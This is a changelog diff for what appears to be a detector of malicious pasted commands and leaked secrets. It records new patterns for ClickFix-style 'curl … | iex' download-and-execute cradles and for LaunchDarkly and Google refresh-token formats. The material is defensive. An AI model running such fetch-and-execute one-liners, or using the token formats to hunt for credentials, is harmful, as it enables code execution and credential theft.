@@ -2,6 +2,33 @@
 
 All notable changes to HLSE Core (C reference) follow [Keep a Changelog](https://keepachangelog.com/en/1.1.0/).
 
+## Cycle 521 — `| iex` pipe cradle + LaunchDarkly / GCP-refresh secrets
+
+### Fixed
+- **PASTE_PIPE_SHELLS missed `| iex`** — the canonical ClickFix
+  cradle target. `curl http://e/x | iex` scored **0** while the
+  twin `iwr http://e/x | iex` scored 65: the fetch-tool ×
+  interpreter-pipe table listed `| powershell`/`| pwsh` but not
+  the `iex`/`invoke-expression` aliases. Added `| iex`, `|iex`,
+  `| invoke-expression`, `|invoke-expression` —
+  `curl u | iex` → 40 (same tier as `| sh`), `wget u |
+  invoke-expression` → 85.
+- **SECRET_PATTERNS lacked LaunchDarkly** — SDK keys `sdk-`+UUID,
+  mobile keys `mob-`+UUID, and `api-`+UUID access tokens scored 0.
+  Added three rows at 80 behind a new `is_hex_dash` charset
+  (hex + `-` admits UUID bodies while excluding plain words —
+  `sdk-version`, `mob-rules` stay 0).
+- **Google OAuth2 refresh token** `1//0` + ~60-char base64url body
+  scored 0 — added `1//0` + min-40 `is_b64url` at 85; the `1//0`
+  lead does not occur in ordinary prose or code.
+
+### Notes
+- Probe artifacts recorded this cycle (not gaps): `dapi`/`r8_`/
+  `hf_`/`ASIA`/`SK`/`AC` all score correctly at real formats —
+  earlier 0 reads were uniform-tail probes suppressed by
+  `is_placeholder_secret`, not missing rows.
+- Suite: +10 jchecks (six positive, four benign).
+
 ## Cycle 520 — Secrets: Notion legacy `secret_` integration token
 
 ### Fixed
